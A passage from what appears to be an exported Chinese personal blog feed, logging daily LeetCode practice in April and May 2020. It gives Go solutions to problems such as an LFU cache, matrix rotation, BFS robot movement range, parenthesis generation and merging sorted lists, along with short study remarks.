class="keyword">else</span> &#123;</span><br><span class="line">				ans += leftMax - height[left]</span><br><span class="line">			&#125;</span><br><span class="line">			left++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> height[right] &gt;= rightMax &#123;</span><br><span class="line">				rightMax = height[right]</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				ans += rightMax - height[right]</span><br><span class="line">			&#125;</span><br><span class="line">			right--</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	height := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>&#125;</span><br><span class="line">	fmt.Println(trap(height))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-5"><a href="#2020-4-5" class="headerlink" title="2020/4/5"></a>2020/4/5</h3><h4 id="leetcode-460-LFU缓存-Go"><a href="#leetcode-460-LFU缓存-Go" class="headerlink" title="leetcode 460. LFU缓存_Go"></a>leetcode 460. LFU缓存_Go</h4><p>真难……</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Node struct</span></span><br><span class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</span><br><span class="line">	key, value <span class="keyword">int</span></span><br><span class="line">	num        <span class="keyword">int</span>   <span class="comment">// 调用次数</span></span><br><span class="line">	prev, next *Node <span class="comment">// 前序，后继指针，为双重链表做准备</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DoubleList prepare for freeList</span></span><br><span class="line"><span class="keyword">type</span> DoubleList <span class="keyword">struct</span> &#123;</span><br><span class="line">	head, tail *Node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ConstructorDB init</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConstructorDB</span><span class="params">()</span> *<span class="title">DoubleList</span></span> &#123;</span><br><span class="line">	head, tail := &amp;Node&#123;&#125;, &amp;Node&#123;&#125;</span><br><span class="line">	head.next, tail.prev = tail, head</span><br><span class="line">	<span class="keyword">return</span> &amp;DoubleList&#123;</span><br><span class="line">		head: head,</span><br><span class="line">		tail: tail,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LFUCache struct</span></span><br><span class="line"><span class="keyword">type</span> LFUCache <span class="keyword">struct</span> &#123;</span><br><span class="line">	capacity <span class="keyword">int</span></span><br><span class="line">	rest     <span class="keyword">int</span> <span class="comment">// 剩余容量</span></span><br><span class="line">	minFreq  <span class="keyword">int</span> <span class="comment">// 当前最少num</span></span><br><span class="line">	cache    <span class="keyword">map</span>[<span class="keyword">int</span>]*Node</span><br><span class="line">	freqList <span class="keyword">map</span>[<span class="keyword">int</span>]*DoubleList <span class="comment">// key是调用的num，每个建对应的值是一个链表,越靠近头结点调用的越近</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructor init</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">(capacity <span class="keyword">int</span>)</span> <span class="title">LFUCache</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> LFUCache&#123;</span><br><span class="line">		capacity: capacity,</span><br><span class="line">		rest:     capacity,</span><br><span class="line">		cache:    <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]*Node),</span><br><span class="line">		freqList: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]*DoubleList),</span><br><span class="line">		minFreq:  <span class="number">0</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove node from DoubleList</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">Remove</span><span class="params">(node *Node)</span></span> &#123;</span><br><span class="line">	node.prev.next = node.next</span><br><span class="line">	node.next.prev = node.prev</span><br><span class="line">	node.next = <span class="literal">nil</span></span><br><span class="line">	node.prev = <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IsEmpty -&gt; Judge if DoubleList is empty</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">IsEmpty</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.head.next == p.tail</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AddNode -&gt; add node to doubleList</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">AddNode</span><span class="params">(node *Node)</span></span> &#123;</span><br><span class="line">	node.next = p.head.next</span><br><span class="line">	node.prev = p.head</span><br><span class="line">	p.head.next.prev = node</span><br><span class="line">	p.head.next = node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UpdateFre freeList</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *LFUCache)</span> <span class="title">UpdateFre</span><span class="params">(node *Node)</span></span> &#123;</span><br><span class="line">	freq := node.num</span><br><span class="line">	p.freqList[freq].Remove(node)</span><br><span class="line">	<span class="comment">// Judge if its num is min</span></span><br><span class="line">	<span class="keyword">if</span> p.minFreq == freq &amp;&amp; p.freqList[freq].IsEmpty() &#123;</span><br><span class="line">		p.minFreq++</span><br><span class="line">		<span class="built_in">delete</span>(p.freqList, freq)</span><br><span class="line">	&#125;</span><br><span class="line">	node.num++</span><br><span class="line">	<span class="keyword">if</span> p.freqList[node.num] == <span class="literal">nil</span> &#123;</span><br><span class="line">		p.freqList[node.num] = ConstructorDB()</span><br><span class="line">	&#125;</span><br><span class="line">	p.freqList[node.num].AddNode(node)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get output</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *LFUCache)</span> <span class="title">Get</span><span class="params">(key <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	node, ok := p.cache[key]</span><br><span class="line">	<span class="keyword">if</span> ok &#123;</span><br><span class="line">		p.UpdateFre(node)</span><br><span class="line">		<span class="keyword">return</span> node.value</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoveLast -&gt; remove last node</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *DoubleList)</span> <span class="title">RemoveLast</span><span class="params">()</span> *<span class="title">Node</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> p.IsEmpty() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	last := p.tail.prev</span><br><span class="line">	p.Remove(last)</span><br><span class="line">	<span class="keyword">return</span> last</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Put input</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *LFUCache)</span> <span class="title">Put</span><span class="params">(key <span class="keyword">int</span>, value <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> p.capacity == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	node, ok := p.cache[key]</span><br><span class="line">	<span class="keyword">if</span> ok &#123;</span><br><span class="line">		node.value = value</span><br><span class="line">		p.UpdateFre(node)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> p.rest == <span class="number">0</span> &#123;</span><br><span class="line">			node := p.freqList[p.minFreq].RemoveLast()</span><br><span class="line">			<span class="built_in">delete</span>(p.cache, node.key)</span><br><span class="line">			p.rest++</span><br><span class="line">		&#125;</span><br><span class="line">		temp := &amp;Node&#123;key: key, value: value, num: <span class="number">1</span>&#125;</span><br><span class="line">		p.cache[key] = temp</span><br><span class="line">		<span class="keyword">if</span> p.freqList[<span class="number">1</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">			p.freqList[<span class="number">1</span>] = ConstructorDB()</span><br><span class="line">		&#125;</span><br><span class="line">		p.freqList[<span class="number">1</span>].AddNode(temp)</span><br><span class="line">		p.minFreq = <span class="number">1</span></span><br><span class="line">		p.rest--</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	cache := Constructor(<span class="number">2</span>)</span><br><span class="line">	cache.Put(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">	cache.Put(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(cache.Get(<span class="number">1</span>)) <span class="comment">// 返回 1</span></span><br><span class="line">	cache.Put(<span class="number">3</span>, <span class="number">3</span>)           <span class="comment">// 去除 key 2</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">2</span>)) <span class="comment">// 返回 -1 (未找到key 2)</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">3</span>)) <span class="comment">// 返回 3</span></span><br><span class="line">	cache.Put(<span class="number">4</span>, <span class="number">4</span>)           <span class="comment">// 去除 key 1</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">1</span>)) <span class="comment">// 返回 -1 (未找到 key 1)</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">3</span>)) <span class="comment">// 返回 3</span></span><br><span class="line">	fmt.Println(cache.Get(<span class="number">4</span>)) <span class="comment">// 返回 4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-6"><a href="#2020-4-6" class="headerlink" title="2020/4/6"></a>2020/4/6</h3><p>今天的每日一题我直接放弃了，做之前简单的吧……</p>
<h4 id="leetcode-1013-将数组分成相等的三个部分-Go"><a href="#leetcode-1013-将数组分成相等的三个部分-Go" class="headerlink" title="leetcode 1013. 将数组分成相等的三个部分_Go"></a>leetcode 1013. 将数组分成相等的三个部分_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">canThreePartsEqualSum</span><span class="params">(A []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(A); i++ &#123;</span><br><span class="line">		sum += A[i]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> sum%<span class="number">3</span> != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	target := sum / <span class="number">3</span></span><br><span class="line">	idx, sumTemp := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> idx &lt; <span class="built_in">len</span>(A) &#123;</span><br><span class="line">		sumTemp += A[idx]</span><br><span class="line">		<span class="keyword">if</span> sumTemp == target &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		idx++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> sumTemp != target &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	idx++</span><br><span class="line">	<span class="keyword">for</span> idx+<span class="number">1</span> &lt; <span class="built_in">len</span>(A) &#123; <span class="comment">// 满足最后一部分非空</span></span><br><span class="line">		sumTemp += A[idx]</span><br><span class="line">		<span class="keyword">if</span> sumTemp == <span class="number">2</span>*target &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">		idx++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	A := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">-6</span>, <span class="number">6</span>, <span class="number">-7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">	fmt.Println(canThreePartsEqualSum(A))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-7"><a href="#2020-4-7" class="headerlink" title="2020/4/7"></a>2020/4/7</h3><h4 id="leetcode-面试题-01-07-旋转矩阵-Go"><a href="#leetcode-面试题-01-07-旋转矩阵-Go" class="headerlink" title="leetcode 面试题 01.07. 旋转矩阵_Go"></a>leetcode 面试题 01.07. 旋转矩阵_Go</h4><p>我自己本身没有去纠结原地算法，我觉得这一题让我进一步了解copy这个机制已经有收获了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rotate</span><span class="params">(matrix [][]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(matrix)</span><br><span class="line">	ans := <span class="built_in">make</span>([][]<span class="keyword">int</span>, length)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		ans[i] = <span class="built_in">make</span>([]<span class="keyword">int</span>, length)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; length; j++ &#123;</span><br><span class="line">			ans[j][length-i<span class="number">-1</span>] = matrix[i][j]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">copy</span>(matrix, ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	matrix := [][]<span class="keyword">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;,</span><br><span class="line">		&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;,</span><br><span class="line">		&#123;<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	rotate(matrix)</span><br><span class="line">	fmt.Println(matrix)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-8"><a href="#2020-4-8" class="headerlink" title="2020/4/8"></a>2020/4/8</h3><h4 id="leetcode-面试题13-机器人的运动范围-Go"><a href="#leetcode-面试题13-机器人的运动范围-Go" class="headerlink" title="leetcode 面试题13. 机器人的运动范围_Go"></a>leetcode 面试题13. 机器人的运动范围_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addNum</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> a &gt; <span class="number">0</span> &#123;</span><br><span class="line">		ans += a % <span class="number">10</span></span><br><span class="line">		a /= <span class="number">10</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">judge</span><span class="params">(row, col, m, n, k <span class="keyword">int</span>, visit [][]<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> row &lt; <span class="number">0</span> || row &gt;= m &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> col &lt; <span class="number">0</span> || col &gt;= n &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> visit[row][col] == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	visit[row][col] = <span class="number">1</span></span><br><span class="line">	ans := addNum(row) + addNum(col)</span><br><span class="line">	<span class="keyword">return</span> ans &lt;= k</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">movingCount</span><span class="params">(m <span class="keyword">int</span>, n <span class="keyword">int</span>, k <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	visit := <span class="built_in">make</span>([][]<span class="keyword">int</span>, m)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; m; i++ &#123;</span><br><span class="line">		visit[i] = <span class="built_in">make</span>([]<span class="keyword">int</span>, n)</span><br><span class="line">	&#125;</span><br><span class="line">	num := <span class="number">0</span></span><br><span class="line">	<span class="comment">// init queue</span></span><br><span class="line">	queue := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	temp := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">	queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">	visit[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">	<span class="comment">// BFS</span></span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(queue) != <span class="number">0</span> &#123;</span><br><span class="line">		top := queue[<span class="number">0</span>]</span><br><span class="line">		queue = queue[<span class="number">1</span>:]</span><br><span class="line">		num++</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>]<span class="number">-1</span>, top[<span class="number">1</span>], m, n, k, visit) &#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>] - <span class="number">1</span>, top[<span class="number">1</span>]&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>]+<span class="number">1</span>, top[<span class="number">1</span>], m, n, k, visit) &#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>] + <span class="number">1</span>, top[<span class="number">1</span>]&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>], top[<span class="number">1</span>]<span class="number">-1</span>, m, n, k, visit) &#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>], top[<span class="number">1</span>] - <span class="number">1</span>&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>], top[<span class="number">1</span>]+<span class="number">1</span>, m, n, k, visit) &#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>], top[<span class="number">1</span>] + <span class="number">1</span>&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(movingCount(<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-9"><a href="#2020-4-9" class="headerlink" title="2020/4/9"></a>2020/4/9</h3><h4 id="leetcode-22-括号生成-Go"><a href="#leetcode-22-括号生成-Go" class="headerlink" title="leetcode 22. 括号生成_Go"></a>leetcode 22. 括号生成_Go</h4><p>这题我是用暴力做的</p>
<p>但引出了切片作为函数参数这个大坑，资料:<a href="https://www.jianshu.com/p/7439e7ae3c4c">https://www.jianshu.com/p/7439e7ae3c4c</a></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先用暴力算法写</span></span><br><span class="line"><span class="comment">// 要是这题的思路弄清楚，我觉得递归就入门了，学习一下</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateParenthesis</span><span class="params">(n <span class="keyword">int</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> current <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">var</span> result = []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line">	generateAll(&amp;current, n*<span class="number">2</span>, &amp;result)</span><br><span class="line">	<span class="comment">//fmt.Println(result)</span></span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateAll</span><span class="params">(current *<span class="keyword">string</span>, n <span class="keyword">int</span>, result *[]<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> n == <span class="built_in">len</span>(*current) &#123;</span><br><span class="line">		<span class="keyword">if</span> valid(*current) &#123;</span><br><span class="line">			*result = <span class="built_in">append</span>(*result, *current)</span><br><span class="line">			<span class="comment">//fmt.Println(result)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	*current += <span class="string">&quot;(&quot;</span></span><br><span class="line">	generateAll(current, n, result)</span><br><span class="line">	*current = (*current)[:<span class="built_in">len</span>(*current)<span class="number">-1</span>]</span><br><span class="line">	*current += <span class="string">&quot;)&quot;</span></span><br><span class="line">	generateAll(current, n, result)</span><br><span class="line">	*current = (*current)[:<span class="built_in">len</span>(*current)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">valid</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	balance := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(str); i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">string</span>(str[i]) == <span class="string">&quot;(&quot;</span> &#123;</span><br><span class="line">			balance++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			balance--</span><br><span class="line">			<span class="keyword">if</span> balance &lt; <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> balance == <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ans := generateParenthesis(<span class="number">3</span>)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法唯手熟尔5月</title>
    <url>/2020/05/01/%E7%AE%97%E6%B3%95%E5%94%AF%E6%89%8B%E7%86%9F%E5%B0%945%E6%9C%88/</url>
    <content><![CDATA[<p>keep going keep going</p>
<span id="more"></span>

<h3 id="2020-5-1"><a href="#2020-5-1" class="headerlink" title="2020/5/1"></a>2020/5/1</h3><p>5/1第一天，半年又要过去了</p>
<h4 id="leetcode-21-合并两个有序链表-Go"><a href="#leetcode-21-合并两个有序链表-Go" class="headerlink" title="leetcode 21. 合并两个有序链表_Go"></a>leetcode 21. 合并两个有序链表_Go</h4><p>很简单的题目</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ListNode Struct</span></span><br><span class="line"><span class="keyword">type</span> ListNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val  <span class="keyword">int</span></span><br><span class="line">	Next *ListNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mergeTwoLists</span><span class="params">(l1 *ListNode, l2 *ListNode)</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> l1 == <span class="literal">nil</span> &amp;&amp; l2 == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> l1 == <span class="literal">nil</span> || l2 == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> l1 == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> l2</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> l1</span><br><span class="line">	&#125;</span><br><span class="line">	head := &amp;ListNode&#123;&#125;</span><br><span class="line">	tail := head</span><br><span class="line">	<span class="keyword">for</span> l1 != <span class="literal">nil</span> &amp;&amp; l2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> l1.Val &lt; l2.Val &#123;</span><br><span class="line">			tail.Next = l1</span><br><span class="line">			l1 = l1.Next</span><br><span class="line">			tail = tail.Next</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			tail.Next = l2</span><br><span class="line">			l2 = l2.Next</span><br><span class="line">			tail = tail.Next</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> l1 != <span class="literal">nil</span> &#123;</span><br><span class="line">		tail.Next = l1</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> l2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		tail.Next = l2</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head.Next</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	l1 := &amp;ListNode&#123;<span class="number">1</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l1.Next = &amp;ListNode&#123;<span class="number">2</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l1.Next.Next = &amp;ListNode&#123;<span class="number">4</span>, <span class="literal">nil</span>&#125;</span><br><span class="line"></span><br><span class="line">	l2 := &amp;ListNode&#123;<span class="number">1</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l2.Next = &amp;ListNode&#123;<span class="number">3</span>, <span class="literal">nil</span>&#125;</span><br><span class="line">	l1.Next.Next = &amp;ListNode&#123;<span class="number">4</span>, <span class="literal">nil</span>&#125;</span><br><span class="line"></span><br><span class="line">	root := mergeTwoLists(l1, l2)</span><br><span class="line">	fmt.Println(root.Val)</span><br><span class="line">	fmt.Println(root.Next.Val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

